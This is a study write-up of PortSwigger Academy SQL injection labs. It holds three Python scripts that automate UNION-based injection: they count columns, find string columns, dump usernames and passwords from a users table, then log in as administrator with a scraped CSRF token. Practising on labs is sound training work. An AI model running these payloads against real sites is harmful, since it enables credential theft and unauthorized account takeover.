# SQL injection UNION attacks
https://portswigger.net/web-security/sql-injection/union-attacks


## 1 Determining the number of columns

```python
import requests
import json
import urllib

# Description:
# An automated SQL 'Union based' exploit script to perform the following:
# (1) identify number of columns
# (2) identify which column are String type
# (3) inject query
#
# This is my OSWE prep to better python scripting skills. 
# The lab used for this practice can be found in Portswigger Academy
# Web Security Academy > SQL injection > UNION attacks > Lab

# URL of target
URL = "https://ac6c1ffb1f9581c0c03208ce000a00e5.web-security-academy.net/filter?category=Corporate+gifts"

found = False	# boolean flag for finding no. of cols
addText = "null," 	# null string to test columns

count = 0  	# counter start
maxCount = 20    # maximum number of cols to try


# Lab (1) identify number of columns

print("Detecting number of columns\n")
while(found == False):

	# The "null" string will keep incrementing until a "Success" condition is identified	
	payload = "' union select {}null--".format(count*addText)
	print("Trying... {} column: {}".format(count+1,payload))

	res = requests.get(URL+payload)
	data = res.text

	# To identify a "Success" condition, the response 
	# would contain the following results "product?productId"
	# We shall search an occurence of it using the condition below 
	if (data.count('/product?productId') > 1):
		print("\n[+] Found! There are {} columns.".format(count+1))
		print("[+] Payload used: {}\n".format(payload))		
		found = True
		break

	count=count+1

```

![](SQL%20Injection/screens/union_attacks_find_columns.png)


## 2 Finding columns with a useful data type
Building on the previous script. 

```python
import requests
import json
import urllib


# URL of target

keyword = 'Accessories' # used to match when looking for total columns
URL = "https://0a8700b503e39a59c0a123d1006e0049.web-security-academy.net/filter?category="

# payload = "' union select null--"

# res = requests.get(URL+payload)
# print(res)

found = False;
col_index = 0  # counter for no. of columns

print("1 Detecting no of columns with union attack...")

while(found == False):
	payload = "' union select {}null--".format(col_index*'null,')
	res = requests.get(URL+payload)
	if (keyword in res.text):
		found = True
		break
	else:
		col_index=col_index+1

col_count = col_index+1
print("[+] Found! Total columns detected = {}\n".format(col_count))

print("2 Detecting columns with text")
found = False
# colText = 0 # counter for which column is string type

# Make the database retrieve the string: 'F47hhS'
for index in range(col_count):
	array = ['null'] * col_count
	array[index] = "'F47hhS'"
	stringWithComma = ",".join(array) 
	payload = "'union select {}--".format(stringWithComma)

	res = requests.get(URL+payload)
	if res.status_code == 200:	
		print("[+] Found! column index {} is a string type\n".format(index))
		# colText = index
	
```


## 3 Retrieve data from users table
This is a good 'lesson' because to automate this exploitation consisting of the following steps: 
1. Retrieve administrator password - Exploit the union command with a select statement
2. Scrap the password field using lib like BeautifulSoup 
3. Login with password - (i) get csrf token (ii) post with cookies and data

```python

import requests
import json
import urllib
from bs4 import BeautifulSoup

# Challenge 3: The database contains a different table called users, with columns called username 

#modify here ---------
baseURL = "https://0a9e006904f4af04c04448d1007300ae.web-security-academy.net"
cookies = {'session':'JilOMVkb4OuKzqxTfnJrUqAS43CxuvqY'}
#modify end ----------

exploitURL = baseURL + "/filter?category="
loginURL = baseURL + "/login"
username = ""
password = "" 
csrf_token = ""

print("3 Retrieve data from users table")

payload = "' union select username, password from users--"

html_content = requests.get(exploitURL+payload).text

soup = BeautifulSoup(html_content,"html.parser")


table = soup.find('table', class_='is-table-longdescription')
print("Searching for 'administrator' ...")
for row in table.tbody.find_all('tr'):
		headers = str(row.find_all('th'))
		if 'administrator' in headers:
			print("[+] Found password!")
			username = row.find('th').text.strip()
			password = row.find('td').text.strip()

print("		[+] username: {}".format(username))
print("		[+] password: {}".format(password))

#https://0aea00b004101da9c0db297000910086.web-security-academy.net/login
   # <section>
   #      <form class=login-form method=POST action=/login>
   #          <input required type="hidden" name="csrf" value="..................">
   #          <label>Username</label>

print("\nAttempt to login with credentials...")
print("finding csrf token... ")
html_content = requests.get(url = loginURL, cookies=cookies).text
soup = BeautifulSoup(html_content, "html.parser")
csrf_token = soup.find('input', {'name':'csrf'})['value']
print("		[+] csrf token found! : {}".format(csrf_token))

print("\nLoggin in... ")

# data body
# csrf=7XVCXSjAhQbU9Osbin89zpr0tCQUQVXn&username=test&password=pw
data = "csrf={}&username={}&password={}".format(csrf_token,username,password)

res = requests.post(url = loginURL, data = data, cookies=cookies)

#if login is successful you will see 'Log out' 
if "Log out" in res.text:
	print("[+] Successfully logged in!")
```